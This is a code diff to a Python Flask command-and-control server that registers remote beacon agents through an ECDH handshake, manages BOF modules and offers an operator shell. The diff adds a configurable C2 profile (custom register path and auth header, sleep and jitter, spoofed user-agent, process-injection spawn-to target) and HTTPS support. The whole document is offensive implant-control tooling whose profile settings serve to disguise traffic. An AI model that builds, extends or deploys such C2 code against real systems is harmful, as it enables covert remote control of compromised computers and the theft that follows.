@@ -1,4 +1,3 @@
-#!/usr/bin/env python3
 import os, re, sys, json, uuid, threading, logging, struct, hashlib
 from datetime import datetime
 from flask import Flask, request
@@ -9,11 +8,21 @@ from cryptography.hazmat.primitives.asymmetric.ec import (
 from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
 from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
 
+from profile_loader import load_profile
+
 # ---------------------------------------------------------------------------
-# Flask app
+# Flask app & C2 Profile
 # ---------------------------------------------------------------------------
 app = Flask(__name__)
 logging.getLogger("werkzeug").setLevel(logging.ERROR)
+
+# Load C2 profile
+PROFILE_DIR = "profiles"
+PROFILE_FILE = os.path.join(PROFILE_DIR, "default.json")
+profile = load_profile(PROFILE_FILE)
+if not profile:
+    print("[!] Failed to load C2 profile from " + PROFILE_FILE)
+    sys.exit(1)
 
 # agents[aid] = { ...metadata..., "key": bytes }
 agents        = {}
@@ -22,7 +31,10 @@ BOF_DIR       = "bofs"
 UPLOAD_DIR    = "uploads"
 STATE_FILE    = "agents.json"
 AUTH_TOKEN    = os.environ.get("C2_AUTH_TOKEN", "")
-AUTH_HEADER   = "X-C2-Token"
+AUTH_HEADER   = profile.auth_header
+SSL_CERT_FILE = os.environ.get("C2_SSL_CERT", "")
+SSL_KEY_FILE  = os.environ.get("C2_SSL_KEY", "")
+SSL_CONTEXT   = (SSL_CERT_FILE, SSL_KEY_FILE) if SSL_CERT_FILE and SSL_KEY_FILE else None
 
 _print_lock     = threading.Lock()
 _current_prompt = ""
@@ -255,6 +267,7 @@ def new_agent(key: bytes) -> dict:
 # ---------------------------------------------------------------------------
 
 @app.route("/register", methods=["POST"])
+@app.route(f"{profile.register_path}", methods=["POST"])
 def route_register():
     """
     ECDH handshake — plaintext, no encryption yet.
@@ -272,7 +285,7 @@ def route_register():
     if AUTH_TOKEN:
         token = request.headers.get(AUTH_HEADER, "")
         if token != AUTH_TOKEN:
-            async_log(f"Bad /register auth token from {request.remote_addr}", "warn")
+            async_log(f"Bad {profile.register_path} auth token from {request.remote_addr}", "warn")
             return b"forbidden", 403
 
     if len(beacon_pub_bytes) != 65 or beacon_pub_bytes[0] != 0x04:
@@ -508,12 +521,25 @@ def cmd_output(aid, n=10):
         print()
     section_end()
 
+def cmd_profile():
+    header("C2 PROFILE", sub=profile.name)
+    row("Name",               profile.name)
+    row("Base Sleep",         f"{profile.base_sleep_ms}ms")
+    row("Jitter",             f"±{profile.jitter_ms}ms")
+    row("User-Agent",         profile.user_agent[:50] + ("..." if len(profile.user_agent) > 50 else ""))
+    row("Auth Header",        profile.auth_header)
+    row("Injection Enabled",  "Yes" if profile.injection_enabled else "No")
+    if profile.injection_enabled:
+        row("Spawn-To",       profile.spawn_to)
+    section_end()
+
 def cmd_help():
     header("COMMAND REFERENCE")
     sections = [
         ("GLOBAL", [
             ("list",               "list all agents"),
             ("bofs",               "list available BOF modules"),
+            ("profile",            "show active C2 profile"),
             ("use <id>",           "select agent by full or partial ID"),
             ("clear",              "clear the terminal"),
             ("help",               "show this reference"),
@@ -606,6 +632,8 @@ def interactive_shell():
                 cmd_list()
             elif cmd == "bofs":
                 cmd_bofs()
+            elif cmd == "profile":
+                cmd_profile()
             elif cmd == "help":
                 cmd_help()
             elif cmd == "use":
@@ -661,6 +689,7 @@ def interactive_shell():
 def banner():
     print(f"\n{c(HL, DIM)}")
     print(f"  {c('C2 SERVER', BOLD + WHITE)}")
+    print(f"  {c('Profile: ' + profile.name, GREY)}")
     print(f"{c(HL, DIM)}\n")
 
 if __name__ == "__main__":
@@ -672,9 +701,11 @@ if __name__ == "__main__":
 
     if AUTH_TOKEN:
         log(f"register auth enabled  header={AUTH_HEADER}", "warn")
+    if SSL_CONTEXT:
+        log(f"HTTPS enabled  cert={SSL_CERT_FILE} key={SSL_KEY_FILE}", "warn")
 
     def _flask():
-        app.run(host="0.0.0.0", port=8080, debug=False, use_reloader=False, threaded=True)
+        app.run(host="0.0.0.0", port=8080, debug=False, use_reloader=False, threaded=True, ssl_context=SSL_CONTEXT)
 
     threading.Thread(target=_flask, daemon=True).start()
 
